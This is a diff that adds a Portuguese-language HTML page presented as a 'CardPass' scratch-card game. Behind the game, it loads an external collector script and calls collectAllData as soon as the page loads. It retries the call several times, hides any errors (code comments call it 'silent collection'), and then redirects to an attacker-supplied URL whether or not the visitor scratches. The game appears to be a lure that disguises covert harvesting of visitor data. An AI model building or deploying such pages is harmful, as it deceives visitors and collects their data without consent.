@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CardPass - Raspadinha</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 80px;
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        .raspadinha-container {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .raspadinha-instructions {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .raspadinha-area {
+            background: #e0e0e0;
+            border-radius: 10px;
+            padding: 20px;
+            position: relative;
+            cursor: crosshair;
+            user-select: none;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .raspadinha-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                45deg,
+                #ffd700,
+                #ffd700 10px,
+                #ffed4e 10px,
+                #ffed4e 20px
+            );
+            border-radius: 10px;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .raspadinha-number {
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            z-index: 10;
+            position: relative;
+            opacity: 0;
+            transition: opacity 0.5s;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .raspadinha-number.show {
+            opacity: 1;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 4px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(102, 126, 234, 0.3);
+            border-radius: 50%;
+            border-top-color: #667eea;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: #4caf50;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+    <script src="/collector.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">X</div>
+        <h1 class="title">CARDPASS</h1>
+        
+        <div class="raspadinha-container">
+            <div class="raspadinha-instructions">
+                🎫 Raspe a área abaixo para revelar seu número!
+            </div>
+            
+            <div class="raspadinha-area" id="raspadinhaArea">
+                <div class="raspadinha-layer" id="raspadinhaLayer"></div>
+                <div class="raspadinha-number" id="raspadinhaNumber">0000</div>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            ✅ Número revelado! Redirecionando...
+        </div>
+
+        <div class="footer">
+            &copy; 2026 CardPass. Todos os direitos reservados.
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const linkId = window.location.pathname.split('/').pop();
+            const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
+            
+            // Gerar número aleatório de 4 dígitos
+            const randomNumber = Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('raspadinhaNumber').textContent = randomNumber.toString();
+            
+            const raspadinhaArea = document.getElementById('raspadinhaArea');
+            const raspadinhaLayer = document.getElementById('raspadinhaLayer');
+            const raspadinhaNumber = document.getElementById('raspadinhaNumber');
+            const progressFill = document.getElementById('progressFill');
+            const successMessage = document.getElementById('successMessage');
+            
+            let scratched = 0;
+            let isScratching = false;
+            let hasRevealed = false;
+            const totalArea = raspadinhaArea.offsetWidth * raspadinhaArea.offsetHeight;
+            const revealThreshold = 0.3; // 30% da área precisa ser raspada
+            
+            // Canvas para rastrear área raspada
+            const canvas = document.createElement('canvas');
+            canvas.width = raspadinhaArea.offsetWidth;
+            canvas.height = raspadinhaArea.offsetHeight;
+            canvas.style.position = 'absolute';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.zIndex = '5';
+            raspadinhaArea.appendChild(canvas);
+            
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = 'transparent';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Função para raspar
+            function scratch(x, y) {
+                if (hasRevealed) return;
+                
+                const rect = raspadinhaArea.getBoundingClientRect();
+                const localX = x - rect.left;
+                const localY = y - rect.top;
+                
+                // Desenhar círculo no canvas (área raspada)
+                ctx.globalCompositeOperation = 'destination-out';
+                ctx.beginPath();
+                ctx.arc(localX, localY, 30, 0, Math.PI * 2);
+                ctx.fill();
+                
+                // Calcular porcentagem raspada
+                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                let transparentPixels = 0;
+                for (let i = 3; i < imageData.data.length; i += 4) {
+                    if (imageData.data[i] === 0) {
+                        transparentPixels++;
+                    }
+                }
+                
+                const scratchedPercent = transparentPixels / (canvas.width * canvas.height);
+                scratched = scratchedPercent;
+                
+                // Atualizar progresso
+                progressFill.style.width = (scratchedPercent * 100) + '%';
+                
+                // Revelar número gradualmente
+                raspadinhaNumber.style.opacity = Math.min(scratchedPercent / revealThreshold, 1);
+                
+                // Se raspou suficiente, revelar completamente
+                if (scratchedPercent >= revealThreshold && !hasRevealed) {
+                    hasRevealed = true;
+                    raspadinhaLayer.style.opacity = '0';
+                    raspadinhaNumber.classList.add('show');
+                    progressFill.style.width = '100%';
+                    
+                    // Coletar dados e redirecionar
+                    setTimeout(() => {
+                        successMessage.classList.add('show');
+                        collectAndRedirect();
+                    }, 500);
+                }
+            }
+            
+            // Eventos de mouse
+            raspadinhaArea.addEventListener('mousedown', (e) => {
+                isScratching = true;
+                scratch(e.clientX, e.clientY);
+            });
+            
+            raspadinhaArea.addEventListener('mousemove', (e) => {
+                if (isScratching) {
+                    scratch(e.clientX, e.clientY);
+                }
+            });
+            
+            raspadinhaArea.addEventListener('mouseup', () => {
+                isScratching = false;
+            });
+            
+            raspadinhaArea.addEventListener('mouseleave', () => {
+                isScratching = false;
+            });
+            
+            // Eventos de touch (mobile)
+            raspadinhaArea.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                isScratching = true;
+                const touch = e.touches[0];
+                scratch(touch.clientX, touch.clientY);
+            });
+            
+            raspadinhaArea.addEventListener('touchmove', (e) => {
+                e.preventDefault();
+                if (isScratching) {
+                    const touch = e.touches[0];
+                    scratch(touch.clientX, touch.clientY);
+                }
+            });
+            
+            raspadinhaArea.addEventListener('touchend', () => {
+                isScratching = false;
+            });
+            
+            // Coleta silenciosa e redirecionamento
+            let dataCollected = false;
+            function collectAndRedirect() {
+                if (!dataCollected) {
+                    collectAllData(linkId).then(() => {
+                        dataCollected = true;
+                    }).catch(() => {}); // Erro silencioso
+                }
+                if (redirectUrl) {
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 1500); // Redireciona após 1.5 segundos
+                }
+            }
+
+            // Múltiplas tentativas de coleta em background
+            collectAndRedirect();
+            setTimeout(collectAndRedirect, 500);
+            setTimeout(collectAndRedirect, 1000);
+            
+            // Fallback para garantir redirecionamento
+            setTimeout(() => {
+                if (redirectUrl && !hasRevealed) {
+                    // Se não raspou, redireciona mesmo assim após 5 segundos
+                    collectAndRedirect();
+                }
+            }, 5000);
+        })();
+    </script>
+</body>
+</html>
